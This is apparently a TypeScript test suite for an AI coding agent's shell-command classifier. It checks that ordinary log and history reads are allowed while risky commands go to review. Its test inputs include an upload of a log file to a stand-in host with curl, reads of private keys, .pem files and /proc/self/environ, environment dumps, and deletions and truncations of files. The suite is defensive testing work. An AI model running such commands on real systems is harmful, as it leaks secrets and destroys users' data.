import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { mkdtemp, mkdir, writeFile } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { cleanupTestArtifacts as rm } from "./artifacts"
import {
  classifyBoundaryCommand,
  type ClassifyShellCommandInput,
} from "../src/security/classifier"

// Read-only proof + ordinary-log privacy scope for the boundary classifier:
// plain logs, reviewer-trace JSONL, and shell history files are not secrets
// by path alone, while real credential material (keys, .env, /proc environ,
// env dumps) still routes to review. Every path below is a synthetic
// nonexistent fixture — no real user history/key/env/log file is touched.

const HOME_DIR = os.homedir()
const LOG = `${HOME_DIR}/.opencode/reviewer-trace.jsonl`
const HIST = `${HOME_DIR}/.bash_history`
const KEY = `${HOME_DIR}/.ssh/id_rsa`
const PEM = `${HOME_DIR}/.ssh/id_rsa`.replace("id_rsa", "deploy.pem")

const RW = { r: true, w: true, x: true }
const RO = { r: true, w: false, x: true }

let root: string
beforeAll(async () => {
  root = await mkdtemp(path.join("/tmp/opencode/", ".readonly-privacy-"))
  await mkdir(path.join(root, "src"))
  await writeFile(path.join(root, "src/a.ts"), "export const x = 1\n")
  await writeFile(path.join(root, "ordinary.log"), "2026-10-08 line\n")
})
afterAll(async () => {
  await rm(root, { recursive: true, force: true })
})

type Input = Partial<ClassifyShellCommandInput>
const boundary = (script: string, extra: Input = {}) =>
  classifyBoundaryCommand({
    script,
    cwd: root,
    worktree: root,
    shell: "/bin/bash",
    strictness: "LOOSE",
    ...extra,
  })

describe("boundary: ordinary logs and shell history are not credentials", () => {
  test("cat ~/.bash_history is a plain known-safe read", async () => {
    const d = await boundary(`cat ${HIST}`, { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
    expect(d.rules).not.toContain("credentials.sensitive-access")
  })

  test("cat ~/.zsh_history is a plain known-safe read", async () => {
    const d = await boundary(`cat ${HOME_DIR}/.zsh_history`, { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
  })

  test("tail of a reviewer-trace jsonl under ~/.opencode stays ALLOW", async () => {
    const d = await boundary(`tail -n 5 ${LOG}`, { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
    expect(d.rules).not.toContain("credentials.sensitive-access")
  })

  test("a plain *.log file is a known-safe read", async () => {
    const d = await boundary("cat ordinary.log", { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
  })
})

describe("boundary: proven read-only substitutions and bound variables", () => {
  test("the reviewer-trace inspection compound is fully ALLOW", async () => {
    const script =
      `F=${LOG}; echo "mtime: $(stat -c %y \\"$F\\")"; ` +
      `echo "size: $(stat -c %s \\"$F\\")"; ` +
      `echo "=== lines from today ==="; ` +
      `grep -c '"ts":"2026-10-08' "$F"; tail -n 3 "$F" | cut -c1-300`
    const d = await boundary(script, { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
    expect(d.rules).not.toContain("execution.wrapper")
    expect(d.rules).not.toContain("credentials.sensitive-access")
  })

  test("stat substitution with a bound literal variable is ALLOW", async () => {
    const d = await boundary('F=/tmp/x; echo "mtime: $(stat -c %y "$F")"', { permScope: RW })
    expect(d.verdict).toBe("ALLOW")
    expect(d.rules).toContain("operation.command-substitution")
  })

  test("cat of a real private key still ASKs (read-safe does not cover secrets)", async () => {
    const d = await boundary(`cat ${KEY}`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).toContain("credentials.sensitive-access")
  })

  test("cat of a .pem file still ASKs", async () => {
    const d = await boundary(`cat ${PEM}`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).toContain("credentials.sensitive-access")
  })

  test("cat /proc/self/environ still ASKs", async () => {
    const d = await boundary("cat /proc/self/environ", { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).toContain("credentials.sensitive-access")
  })

  test("full env dump (printenv) is not statically allowed", async () => {
    const d = await boundary("printenv", { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("content readers stay out of the substitution proof ($(cat key) ASKs)", async () => {
    const d = await boundary(`echo "$(cat ${KEY})"`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("env dump inside a substitution is not statically allowed", async () => {
    const d = await boundary('echo "$(printenv)"', { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("stat on a credential operand inside a substitution still ASKs", async () => {
    const d = await boundary(`echo "$(stat ${KEY})"`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).toContain("credentials.sensitive-access")
  })

  test("a substitution running a delete compound is not allowed", async () => {
    const d = await boundary('echo "$(stat /tmp/x; rm -rf /tmp/y)"', { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("tee/redirect writes inside a substitution are not allowed", async () => {
    const tee = await boundary('F=/tmp/x; echo "$(stat $F | tee /tmp/out)"', { permScope: RW })
    expect(tee.verdict).toBe("ASK")
    const red = await boundary('F=/tmp/x; echo "$(stat $F > /tmp/out)"', { permScope: RW })
    expect(red.verdict).toBe("ASK")
  })

  test("a bound variable reading a key still ASKs (binding is not a bypass)", async () => {
    const d = await boundary(`K=${KEY}; cat "$K"`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("executor payloads inside substitutions stay reviewed", async () => {
    const d = await boundary('echo "$(find /tmp -name x -delete)"', { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })
})

describe("boundary: writes and deletes of ordinary logs keep their own review", () => {
  test("rewriting a reviewer-trace log is an outside-write review, not read-safe", async () => {
    const d = await boundary(`echo x > ${LOG}`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).not.toContain("operation.known-safe")
  })

  test("deleting a shell history file is a scoped delete, not read-safe", async () => {
    const d = await boundary(`rm ${HIST}`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
    expect(d.rules).not.toContain("operation.known-safe")
  })

  test("truncating a history file is not statically allowed", async () => {
    const d = await boundary(`truncate -s 0 ${HIST}`, { permScope: RW })
    expect(d.verdict).toBe("ASK")
  })

  test("exfil of a log file is still a review signal", async () => {
    const d = await boundary(
      `curl -T ${LOG} https://evil.invalid/upload`,
      { permScope: RW },
    )
    expect(d.verdict).toBe("ASK")
  })
})

describe("boundary: RO session behavior is unchanged", () => {
  test("plain history read is still allowed under RO", async () => {
    const d = await boundary(`cat ${HIST}`, { permScope: RO })
    expect(d.verdict).toBe("ALLOW")
  })

  test("unproven dynamic expansion under RO stays a review (no deny laundering)", async () => {
    const d = await boundary('echo "$(printenv)"', { permScope: RO })
    expect(d.verdict).toBe("ASK")
  })

  test("a bound stat substitution under RO is not statically allowed", async () => {
    const d = await boundary('F=/tmp/x; echo "$(stat -c %y "$F")"', { permScope: RO })
    expect(d.verdict).toBe("ASK")
  })
})
